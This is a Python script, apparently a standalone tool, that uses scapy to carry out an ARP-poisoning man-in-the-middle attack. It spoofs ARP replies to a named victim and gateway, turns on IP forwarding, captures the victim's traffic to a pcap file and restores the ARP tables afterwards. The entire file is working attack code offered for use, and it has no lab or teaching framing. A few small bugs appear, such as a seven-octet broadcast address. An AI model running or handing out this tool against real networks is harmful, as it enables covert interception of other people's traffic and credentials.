from multiprocessing import Process
import argparse
from scapy.all import (ARP, Ether, conf, send, sniff, srp, wrpcap)
# from termcolor import cprint
import sys
import time
import os


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    try:
        resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    except PermissionError as e:
        print(f"ERROR: The program must run with root privileges: {e}")
        exit()
    for _,  r in resp:
        return r[Ether].src
    return None


class Arper():
    def __init__(self, victim, gateway, interface, verbose):
        self.victim = victim
        try:
            self.victimmac = get_mac(victim)
        except:
            os.system("sysctl net.ipv4.ip_forward=0")
            print("[!] Couldn't Find Victim MAC Address ")
            print("[!] Exiting....")
            sys.exit(1)
        self.gateway = gateway
        try:
            self.gatewaymac = get_mac(gateway)
        except:
            os.system("sudo sysctl net.ipv4.ip_forward=0")
            print("[!] Couldn't Find Gateway MAC Address ")
            print("[!] Exiting....")
            sys.exit(1)
        self.interface = interface
        self.verbose = verbose
        conf.iface = interface
        conf.verb = 0

        print(f'[!] Initialized {interface}:')
        print(f'[!] Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'[!] Victim ({victim}) is at {self.victimmac}.')
        print('-'*40)

    def run(self):
        os.system("sysctl net.ipv4.ip_forward=1")
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniffer)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP(op=2, psrc=self.gateway,
                            pdst=self.victim, hwdst=self.victimmac)
        print(poison_victim.summary())
        print('-'*40)

        poison_gateway = ARP(op=2, psrc=self.victim,
                             pdst=self.gateway, hwdst=self.gatewaymac)
        print(poison_gateway.summary())
        print('-'*40)
        print("[!] Beginning the ARP poison. [CTRL-C to stop]")
        while True:
            if not verbose:
                sys.stdout.write('.')
                sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
                time.sleep(2)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()

    def print_packet(self, packet):
        print(packet.summary())

    def sniffer(self):
        time.sleep(5)
        bpf_filter = "ip host %s" % victim
        print("[!] Sniffing packets...")
        if verbose:
            try:
                packets = sniff(filter=bpf_filter,
                                iface=self.interface, prn=self.print_packet)
            except Exception as e:
                print(e)
        else:
            try:
                packets = sniff(filter=bpf_filter, iface=self.interface)
            except Exception as e:
                print(e)
        wrpcap('mitm.pcap', packets)
        print('[!] Got the packets..')
        self.poison_thread.terminate()
        self.restore()

    def restore(self):
        os.system("sysctl net.ipv4.ip_forward=0")
        print('[!] Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        print('[!] Finished...')


if __name__ == '__main__':
    import argparse
    os.system("clear")

    parser = argparse.ArgumentParser(description="MITM ATTACK")
    parser.add_argument(
        "-g", "--gateway", help="Gateway IP for ARP Poisoning attacks", required=True)
    parser.add_argument("-t", "--target", help="Target_IP", required=True)
    parser.add_argument(
        "-i", "--interface", help="Network Interface; default eth0", type=str, default='eth0')
    parser.add_argument("-v", "--verbose", action="count", default=False)
    args = parser.parse_args()
    (victim, gateway, interface, verbose) = (
        args.target, args.gateway, args.interface, args.verbose)
    myarp = Arper(victim, gateway, interface, verbose)
    myarp.run()
